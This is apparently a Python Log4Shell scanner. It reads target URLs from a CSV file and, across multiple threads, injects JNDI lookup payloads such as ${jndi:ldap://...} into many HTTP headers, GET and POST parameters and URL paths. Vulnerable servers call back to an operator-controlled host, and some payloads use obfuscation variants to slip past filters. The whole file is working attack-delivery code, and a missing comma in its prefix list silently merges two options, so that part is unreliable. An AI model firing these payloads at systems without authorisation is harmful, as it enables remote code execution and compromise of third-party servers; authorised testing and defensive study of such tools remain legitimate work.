#!/usr/bin/python3
import requests
import uuid
import logging
import urllib3
import time
import csv
import argparse
import sys
import threading
import queue
from multiprocessing import Queue


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)

header_injects = [
    'X-Api-Version',
    'User-Agent',
    'Referer',
    'X-Druid-Comment',
    'Origin',
    'Location',
    'X-Forwarded-For',
    'Cookie',
    'X-Requested-With',
    'X-Forwarded-Host',
    'Accept'
]

prefixes_injects = [
    'jndi:ldap',
    'jndi:${lower:l}${lower:d}ap'
    'jndi:rmi',
    'jndi:dns',
]

def get_payload(identifier, parameter, hostname, prefix_option: int):
    return f"${{{prefixes_injects[prefix_option]}://{identifier}-{parameter}.{hostname}}}"

def perform_request(method: str, identifier: str, url: str, url_id: str, parameters: list, hostname: str, timeout: int, prefix_option: int):
    try:
        # Injects POST body parameters
        headers = {}
        for header in header_injects:
            headers[header] = get_payload(identifier, header, hostname, prefix_option)

        if method == "POST":
            # Generate POST body without url-encode (probably can be prettier)
            data = "{"
            for parameter in parameters:
                data += f"{parameter}={get_payload(identifier, parameter, hostname, prefix_option)}&"
            data = data[:-1]
            data += "}"

            r = requests.post(
                url,
                headers=headers,
                timeout=timeout,
                data=data,
                verify=False
            )
        
        # Injects GET parameters
        elif method == "GET":
            data = {}
            for parameter in parameters:
                data[parameter] = get_payload(identifier, parameter, hostname, prefix_option)
            r = requests.get(
                url,
                headers=headers,
                timeout=timeout,
                params=data,
                verify=False
            )
        
        # Injects URL without paramters (No Parameters)
        elif method == "GETNP":
            if url[-1] == "/":
                url = url[:-1]
            r = requests.get(
                f"{url}/{get_payload(identifier, 'get', hostname, prefix_option)}",
                headers=headers,
                timeout=timeout,
                verify=False
            )

        logging.info(f"{identifier} : {url_id} : {url} - {method} : {r.status_code}")

    except requests.exceptions.ConnectionError as e:
        logging.warning(f"{identifier} : {url_id} : {url} - {e}")

def scan(row_queue: Queue, done_queue: Queue, hostname: str, wait: int, timeout: int, prefix_option: int):
    while not row_queue.empty():
        row = row_queue.get()
        if row in done_queue.queue:
            logging.info(f"Already done: {row[0]} : {row[1]} - {row[2]}")
            row_queue.task_done()
            continue
        done_queue.put(row)
        try:
            url_id = row[0]
            url = row[1]
            method = row[2]
            parameters = row[3].replace(" ", "").split(",") 
        except IndexError:
            logging.warning("Filename should be in the following format: URL info, URL, POST/GET/GETNP, query parameters")
            row_queue.task_done()
            continue

        if url != "":
            identifier = uuid.uuid4()
            # Catch anything and complete the queue item.
            try:
                perform_request(method, identifier, url, url_id, parameters, hostname, timeout, prefix_option)
            except Exception as e:
                logging.error(e)
                row_queue.task_done()
                continue

            time.sleep(wait)

        row_queue.task_done()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", required=True, help="The CSV filename containing the URLs.")
    parser.add_argument("-u", "--url", required=True, help="DNS subdomain URL")
    parser.add_argument("-w", "--wait", type=int, default=1, help="Number of seconds to wait before next request (default: 1)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="HTTP timeout in seconds to use (default: 5)")
    parser.add_argument("-p", "--prefix", type=int, default=0, help="Type of prefix, see prefixes_injects for options. (default: 0, options 0-3)")
    parser.add_argument("-q", "--threads", type=int, default=1, help="Number of threads to distribute the work")
    parser.add_argument("-d", "--done", help="File where we can keep track of items that are done.")
    args = parser.parse_args()

    row_queue = queue.Queue()

    done_queue = queue.Queue()

    if args.done is not None:
        try:
            with open(args.done) as csvfile:
                rowreader = csv.reader(csvfile)
                for row in rowreader:
                    done_queue.put(row)
        except FileNotFoundError:
            pass

    with open(args.file) as csvfile:
        urlreader = csv.reader(csvfile)
        next(urlreader, None)  # skip the CSV header
        for row in urlreader:
            row_queue.put(row)
        
    logging.info(f"Starting {args.threads} threads to scan URLs.")

    for i in range(args.threads):
        t = threading.Thread(target=scan, name=f"Thread {i}", args=(row_queue, done_queue, args.url, args.wait, args.timeout, args.prefix))
        t.start()
    
    row_queue.join()

    if args.done is not None:
        with open(args.done, 'w', newline='') as csvfile:
            rowwriter = csv.writer(csvfile)
            while not done_queue.empty():
                rowwriter.writerow(done_queue.get())


if __name__ == "__main__":
    main()
